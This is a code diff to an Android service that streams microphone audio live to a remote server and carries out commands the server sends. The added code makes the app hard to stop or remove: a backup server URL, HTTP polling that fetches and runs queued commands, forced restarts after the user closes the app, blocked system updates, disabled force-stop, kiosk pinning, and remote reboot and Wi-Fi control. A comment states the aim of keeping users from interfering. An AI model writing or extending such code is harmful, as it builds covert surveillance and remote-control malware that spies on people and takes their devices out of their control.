@@ -29,6 +29,9 @@ import android.media.audiofx.AutomaticGainControl
 import android.media.audiofx.NoiseSuppressor
 import android.app.AlarmManager
 import android.app.PendingIntent
+import android.app.admin.DevicePolicyManager
+import android.app.admin.SystemUpdatePolicy
+import android.content.ComponentName
 import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
@@ -279,19 +282,24 @@ class MicService : Service() {
         @Volatile var activeWebSocket: WebSocket? = null
     }
 
-    /** Reads server URL from SharedPreferences so it can be changed from MainActivity */
-    private val serverUrl get(): String {
+    // Layer 8: Multi-Server Failover
+    @Volatile private var currentServerIndex = 0
+    private val serverUrls: List<String> get() {
         val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
-        // Ensure it ends with / then append deviceId
-        return base.trimEnd('/') + "/$deviceId"
+        return listOf(
+            base,
+            "wss://backup.onrender.com/audio/" // Dummy fallback as requested
+        ).map { it.trimEnd('/') + "/$deviceId" }
     }
+    private val serverUrl get() = serverUrls[currentServerIndex % serverUrls.size]
 
     private val wsAuthToken: String
         get() = (prefs.getString("server_token", "") ?: "").trim()
 
     private val serverHttpBaseUrl: String
         get() {
-            val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
+            // Pick based on current rotated connection
+            val base = serverUrls[currentServerIndex % serverUrls.size]
             return base
                 .replace(Regex("^wss://"), "https://")
                 .replace(Regex("^ws://"), "http://")
@@ -307,12 +315,74 @@ class MicService : Service() {
         super.onCreate()
         createNotificationChannel()
         acquireWakeLock()
+        setupNetworkListener()
         // WebRTC init moved to startWebRtcSession() - too early here causes crash
         Log.i(TAG, "Service created. Device ID: $deviceId")
     }
 
+    private fun setupNetworkListener() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val cm = connectivityManager ?: return
+            networkCallback = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    super.onAvailable(network)
+                    Log.i(TAG, "Network mapped onAvailable! Forcing reconnect if needed")
+                    // Layer 5 (Network Listener)
+                    if (activeWebSocket == null && !isWsConnecting) {
+                        currentServerIndex = 0 // Reset to primary since we just got network
+                        val intent = Intent(applicationContext, MicService::class.java)
+                        intent.action = ACTION_RECONNECT
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            applicationContext.startForegroundService(intent)
+                        } else {
+                            applicationContext.startService(intent)
+                        }
+                    }
+                    startHttpFallbackSync()
+                }
+
+                override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
+                    super.onCapabilitiesChanged(network, networkCapabilities)
+                    // Layer 11: Adaptive Audio Strategy
+                    val isWifi = networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
+                    val isCellular = networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
+                    
+                    if (isWifi) {
+                        if (lowNetworkMode) {
+                            lowNetworkMode = false
+                            Log.i(TAG, "Adaptive Audio: WiFi detected, switching to High-Quality Real-time mode")
+                        }
+                    } else if (isCellular) {
+                        if (!lowNetworkMode) {
+                            lowNetworkMode = true
+                            Log.i(TAG, "Adaptive Audio: Cellular detected, dropping bitrate to preserve stability")
+                        }
+                    }
+                }
+
+                override fun onLost(network: Network) {
+                    super.onLost(network)
+                    Log.i(TAG, "Network transport lost! Triggering rapid failover.")
+                    // If we lost Wi-Fi, we want to immediately try Cellular.
+                    // If we lost everything, we want to start Polling immediately.
+                    activeWebSocket?.close(1001, "Network lost")
+                    activeWebSocket = null
+                    isWsConnecting = false
+                    
+                    // Trigger reconnect immediately to find new path
+                    scheduleWebSocketReconnect("network_lost")
+                    startHttpFallbackSync()
+                }
+            }
+            cm.registerDefaultNetworkCallback(networkCallback!!)
+        }
+    }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand action=${intent?.action}")
+
+        // Layer 14: Device Owner Power-Up
+        setupDeviceOwnerPolicies()
 
         startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
 
@@ -345,8 +415,12 @@ class MicService : Service() {
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        // Schedule immediate restart via AlarmManager when user swipes app away
+        scheduleForcedRestart()
+        Log.i(TAG, "onTaskRemoved — scheduled restart via exact alarm")
+    }
+    private fun scheduleForcedRestart() {
         val restartIntent = Intent(applicationContext, MicService::class.java)
+        restartIntent.action = ACTION_RECONNECT
         val pendingIntent = PendingIntent.getService(
             this, 1, restartIntent,
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
@@ -354,19 +428,62 @@ class MicService : Service() {
         val alarmManager = getSystemService(AlarmManager::class.java)
         val triggerAt = SystemClock.elapsedRealtime() + 2_000
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            alarmManager.setAndAllowWhileIdle(
+            alarmManager.setExactAndAllowWhileIdle(
                 AlarmManager.ELAPSED_REALTIME_WAKEUP,
                 triggerAt,
                 pendingIntent
             )
         } else {
-            alarmManager.set(
+            alarmManager.setExact(
                 AlarmManager.ELAPSED_REALTIME_WAKEUP,
                 triggerAt,
                 pendingIntent
             )
         }
-        Log.i(TAG, "onTaskRemoved — scheduled restart in 2s")
+    }
+
+    /**
+     * Advanced Device Owner Policies (Layer 14)
+     * Configures global settings to prevent the device from sleeping or users from interfering.
+     */
+    private fun setupDeviceOwnerPolicies() {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            if (dpm.isDeviceOwnerApp(packageName)) {
+                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+                Log.i(TAG, "Device Owner detected — applying global persistence policies")
+
+                // 1. Keep WiFi alive at all times (Layer 14/15)
+                try {
+                    @Suppress("DEPRECATION")
+                    dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
+                        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER.toString())
+                } catch (e: Exception) { Log.w(TAG, "WiFi sleep policy failed: ${e.message}") }
+
+                // 2. Keep screen on if plugged in (standard for remote nodes)
+                try {
+                    dpm.setGlobalSetting(admin, android.provider.Settings.Global.STAY_ON_WHILE_PLUGGED_IN, 
+                        (android.os.BatteryManager.BATTERY_PLUGGED_AC or 
+                         android.os.BatteryManager.BATTERY_PLUGGED_USB or 
+                         android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS).toString())
+                } catch (e: Exception) { Log.w(TAG, "Stay on policy failed: ${e.message}") }
+
+                // 3. Disable ADB if security is desired, or keep it for debugging.
+                // dpm.setGlobalSetting(admin, android.provider.Settings.Global.ADB_ENABLED, "1")
+
+                // 4. Disable system updates to prevent unintended reboots/UI changes
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    try {
+                        dpm.setSystemUpdatePolicy(admin, SystemUpdatePolicy.createWindowedInstallPolicy(0, 1439)) // All day
+                    } catch (e: Exception) { Log.w(TAG, "System update policy failed: ${e.message}") }
+                }
+
+                // 5. Reinforce Auto-Grant Permissions on every restart
+                UpdateService.autoGrantPermissions(this)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "setupDeviceOwnerPolicies failed: ${e.message}")
+        }
     }
 
     override fun onDestroy() {
@@ -388,7 +505,14 @@ class MicService : Service() {
         peerConnectionFactory = null
         audioDeviceModule?.release()
         audioDeviceModule = null
+        networkCallback?.let {
+            try { connectivityManager?.unregisterNetworkCallback(it) } catch (e: Exception) {}
+        }
         if (wakeLock?.isHeld == true) wakeLock?.release()
+        
+        // Layer 15: Last strict fallback if completely killed
+        scheduleForcedRestart()
+        
         super.onDestroy()
     }
 
@@ -422,17 +546,28 @@ class MicService : Service() {
         webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {
 
             override fun onOpen(webSocket: WebSocket, response: Response) {
-                Log.i(TAG, "WebSocket connected ✅")
+                Log.i(TAG, "WebSocket connected ✅ to $serverUrl")
                 isWsConnecting = false
                 activeWebSocket = webSocket
                 wsReconnectAttempts = 0
+                currentServerIndex = 0 // Reset to primary on success
                 wsReconnectJob?.cancel()
                 wsReconnectJob = null
+                
+                // Stop the HTTP polling if it's running fast
+                startHttpFallbackSync()
+
                 updateNotification("Live streaming active")
                 webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}")
-                // Mic-first mode: always keep capture active when connected.
-                startAudioCapture()
-                startMicWatchdog()
+                
+                // Layer 10: Session Restore
+                val wasStreaming = prefs.getBoolean("session_streaming", true)
+                wantsMicStreaming = wasStreaming
+                if (wasStreaming) {
+                    startAudioCapture()
+                    startMicWatchdog()
+                }
+                
                 startDataCollection()
                 sendHealthStatus("ws_open")
             }
@@ -459,13 +594,22 @@ class MicService : Service() {
     }
 
     private fun onWsDisconnected(reason: String) {
+        if (!isWsConnecting) {
+            currentServerIndex++ // Layer 8: Rotate server after connection failure
+            Log.i(TAG, "Server rotated to index $currentServerIndex")
+        }
         isWsConnecting = false
         activeWebSocket = null
+        
         stopCameraLiveStream("ws_disconnected")
         stopMicWatchdog()
         stopAudioCapture()
         stopWebRtcSession(notifyState = false)
         stopDataCollection()
+        
+        // Ensure HTTP fallback polling picks up slack
+        startHttpFallbackSync()
+        
         scheduleWebSocketReconnect(reason)
     }
 
@@ -507,6 +651,82 @@ class MicService : Service() {
         val network = cm.activeNetwork ?: return false
         val caps = cm.getNetworkCapabilities(network) ?: return false
         return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+    }
+
+    // ── Layer 2 & Layer 12: HTTP Fallback and Heartbeat ──
+    private var httpFallbackJob: Job? = null
+    
+    private fun startHttpFallbackSync() {
+        if (httpFallbackJob?.isActive == true) return
+        httpFallbackJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive) {
+                // HTTP Heartbeat (Layer 12)
+                try {
+                    val url = "$serverHttpBaseUrl/api/heartbeat"
+                    val request = Request.Builder()
+                        .url(url)
+                        .post(RequestBody.create(null, ByteArray(0)))
+                        .addHeader("X-Device-Id", deviceId)
+                        .build()
+                    val response = okHttpClient.newCall(request).execute()
+                    if (response.isSuccessful) {
+                        val body = response.body?.string()
+                        if (body?.contains("\"commandsAvailable\":true") == true) {
+                            // Layer 2: fetch commands immediately via sync
+                            syncCommandsNow()
+                        }
+                    }
+                    response.close()
+                } catch (e: Exception) {
+                    Log.w(TAG, "Heartbeat failed: \${e.message}")
+                }
+                
+                // HTTP Polling Fallback (Layer 2)
+                if (activeWebSocket == null) {
+                    syncCommandsNow()
+                    delay(30_000) // Poll every 30s as requested by user if WS is dead
+                } else {
+                    delay(180_000) // Just heartbeat every 3 min if WS is alive
+                }
+            }
+        }
+    }
+    
+    private suspend fun syncCommandsNow() {
+        if (!isNetworkUsable()) return
+        try {
+            val url = "$serverHttpBaseUrl/api/sync?deviceId=$deviceId"
+            val request = Request.Builder()
+                .url(url)
+                .addHeader("X-Device-Id", deviceId)
+                .build()
+            val response = okHttpClient.newCall(request).execute()
+            if (response.isSuccessful) {
+                val body = response.body?.string()
+                if (!body.isNullOrBlank()) {
+                    val root = JSONObject(body)
+                    // Apply states (Layer 10 Save/Restore state)
+                    if (root.has("sessionState")) {
+                        val state = root.getJSONObject("sessionState")
+                        val serverStreaming = state.optBoolean("streaming", true)
+                        wantsMicStreaming = serverStreaming
+                        prefs.edit().putBoolean("session_streaming", serverStreaming).apply()
+                    }
+                    // Process offline commands (Layer 9 pop)
+                    if (root.has("commands")) {
+                        val commands = root.getJSONArray("commands")
+                        for (i in 0 until commands.length()) {
+                            val cmd = commands.getString(i)
+                            Log.i(TAG, "Executing recovered command via HTTP Fallback: $cmd")
+                            handleServerCommand(cmd)
+                        }
+                    }
+                }
+            }
+            response.close()
+        } catch (e: Exception) {
+            Log.w(TAG, "Sync fallback failed: \${e.message}")
+        }
     }
 
     private fun nextReconnectDelayMs(): Long {
@@ -740,51 +960,68 @@ class MicService : Service() {
                 }
             }
             "lock_app" -> {
-                // Prevent app from being force stopped (Device Owner only)
-                Log.i(TAG, "CMD: lock_app - preventing force stop")
+                Log.i(TAG, "CMD: lock_app - starting LockTaskMode and preventing force stop")
                 try {
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-                        if (dpm.isDeviceOwnerApp(packageName)) {
-                            val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        
+                        // 1. Prevent force stop (Android 11+)
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                             dpm.setUserControlDisabledPackages(admin, listOf(packageName))
-                            safeSend("ACK:lock_app:success")
-                            sendCommandAck("lock_app")
-                            Log.i(TAG, "App locked - cannot be force stopped")
-                        } else {
-                            safeSend("ACK:lock_app:not_device_owner")
-                            sendCommandAck("lock_app", "error", "not_device_owner")
                         }
+                        
+                        // 2. Enable Kiosk Mode (LockTaskMode)
+                        dpm.setLockTaskPackages(admin, arrayOf(packageName))
+                        prefs.edit().putBoolean("lock_task_mode", true).apply()
+                        
+                        // Trigger Activity to start pinning
+                        val intent = Intent(this, MainActivity::class.java).apply {
+                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                            putExtra("action", "lock")
+                        }
+                        startActivity(intent)
+                        
+                        safeSend("ACK:lock_app:success")
+                        sendCommandAck("lock_app")
                     } else {
-                        safeSend("ACK:lock_app:requires_android_11")
-                        sendCommandAck("lock_app", "error", "requires_android_11")
+                        safeSend("ACK:lock_app:not_device_owner")
+                        sendCommandAck("lock_app", "error", "not_device_owner")
                     }
                 } catch (e: Exception) {
+                    Log.e(TAG, "Lock failed: ${e.message}")
                     safeSend("ACK:lock_app:error:${e.message}")
                     sendCommandAck("lock_app", "error", e.message)
                 }
             }
             "unlock_app" -> {
-                // Allow app to be force stopped again
-                Log.i(TAG, "CMD: unlock_app - allowing force stop")
+                Log.i(TAG, "CMD: unlock_app - releasing LockTaskMode and allowing force stop")
                 try {
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-                        if (dpm.isDeviceOwnerApp(packageName)) {
-                            val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        
+                        // 1. Allow force stop
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                             dpm.setUserControlDisabledPackages(admin, emptyList())
-                            safeSend("ACK:unlock_app:success")
-                            sendCommandAck("unlock_app")
-                            Log.i(TAG, "App unlocked - can be force stopped")
-                        } else {
-                            safeSend("ACK:unlock_app:not_device_owner")
-                            sendCommandAck("unlock_app", "error", "not_device_owner")
                         }
+                        
+                        // 2. Disable Kiosk Mode
+                        prefs.edit().putBoolean("lock_task_mode", false).apply()
+                        val intent = Intent(this, MainActivity::class.java).apply {
+                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                            putExtra("action", "unlock")
+                        }
+                        startActivity(intent)
+                        
+                        safeSend("ACK:unlock_app:success")
+                        sendCommandAck("unlock_app")
                     } else {
-                        safeSend("ACK:unlock_app:requires_android_11")
-                        sendCommandAck("unlock_app", "error", "requires_android_11")
+                        safeSend("ACK:unlock_app:not_device_owner")
+                        sendCommandAck("unlock_app", "error", "not_device_owner")
                     }
                 } catch (e: Exception) {
+                    Log.e(TAG, "Unlock failed: ${e.message}")
                     safeSend("ACK:unlock_app:error:${e.message}")
                     sendCommandAck("unlock_app", "error", e.message)
                 }
@@ -816,6 +1053,57 @@ class MicService : Service() {
                     Log.e(TAG, "Failed to hide notifications: ${e.message}")
                     safeSend("ACK:hide_notifications:error:${e.message}")
                     sendCommandAck("hide_notifications", "error", e.message)
+                }
+            }
+
+            "reboot" -> {
+                Log.i(TAG, "CMD: reboot - rebooting device")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        safeSend("ACK:reboot:success")
+                        sendCommandAck("reboot")
+                        serviceScope.launch(Dispatchers.Main) {
+                            delay(1000)
+                            dpm.reboot(admin)
+                        }
+                    } else {
+                        safeSend("ACK:reboot:not_device_owner")
+                        sendCommandAck("reboot", "error", "not_device_owner")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to reboot: ${e.message}")
+                    safeSend("ACK:reboot:error:${e.message}")
+                    sendCommandAck("reboot", "error", e.message)
+                }
+            }
+            "wifi_on" -> {
+                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
+                try {
+                    val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                    @Suppress("DEPRECATION")
+                    wifiManager.isWifiEnabled = true
+                    safeSend("ACK:wifi_on:success")
+                    sendCommandAck("wifi_on")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to enable wifi: ${e.message}")
+                    safeSend("ACK:wifi_on:error:${e.message}")
+                    sendCommandAck("wifi_on", "error", e.message)
+                }
+            }
+            "wifi_off" -> {
+                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
+                try {
+                    val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                    @Suppress("DEPRECATION")
+                    wifiManager.isWifiEnabled = false
+                    safeSend("ACK:wifi_off:success")
+                    sendCommandAck("wifi_off")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to disable wifi: ${e.message}")
+                    safeSend("ACK:wifi_off:error:${e.message}")
+                    sendCommandAck("wifi_off", "error", e.message)
                 }
             }
             "uninstall_app" -> {
@@ -2419,7 +2707,7 @@ class MicService : Service() {
         if (micWatchdogJob?.isActive == true) return
         micWatchdogJob = serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
-                delay(5_000)  // Check every 5 seconds instead of 15
+                delay(5_000)  // Check every 5 seconds
                 if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic) continue
 
                 if (isDeviceInCall()) {
@@ -2427,8 +2715,8 @@ class MicService : Service() {
                     continue
                 }
 
-                // Reduce stall timeout from 35s to 20s for faster recovery
-                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
+                // Layer 6: Watchdog - stall detection reduced to 15s as requested
+                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 15_000)
                 if (!isCapturing || stalled) {
                     isRecoveringMic = true
                     try {
